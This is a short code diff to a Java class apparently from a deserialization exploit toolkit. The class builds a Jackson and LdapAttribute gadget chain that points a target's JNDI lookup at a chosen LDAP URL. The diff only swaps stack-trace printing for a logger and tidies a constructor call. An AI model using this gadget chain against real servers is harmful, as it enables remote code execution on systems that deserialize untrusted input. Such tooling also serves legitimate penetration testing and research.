@@ -4,6 +4,8 @@ import com.fasterxml.jackson.databind.node.POJONode;
 import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtMethod;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
 
 import javax.management.BadAttributeValueExpException;
 import javax.naming.CompositeName;
@@ -11,7 +13,10 @@ import javax.naming.directory.BasicAttribute;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 public class JacksonLdapAttr implements ObjectPayload<Object> {
+    private static final Logger log = LoggerFactory.getLogger(JacksonLdapAttr.class);
+
     @Override
     public Object getObject(String command) throws Exception {
 
@@ -31,7 +36,7 @@ public class JacksonLdapAttr implements ObjectPayload<Object> {
 
         try {
             Class clazz = Class.forName("com.sun.jndi.ldap.LdapAttribute");
-            Constructor clazz_cons = clazz.getDeclaredConstructor(new Class[]{String.class});
+            Constructor clazz_cons = clazz.getDeclaredConstructor(String.class);
             clazz_cons.setAccessible(true);
             BasicAttribute la = (BasicAttribute) clazz_cons.newInstance(new Object[]{"exp"});
             Field bcu_fi = clazz.getDeclaredField("baseCtxURL");
@@ -50,7 +55,7 @@ public class JacksonLdapAttr implements ObjectPayload<Object> {
             valfield.set(val, node);
             return val;
         } catch (Exception e) {
-            e.printStackTrace();
+            log.error("e: ", e);
         }
         return null;
     }
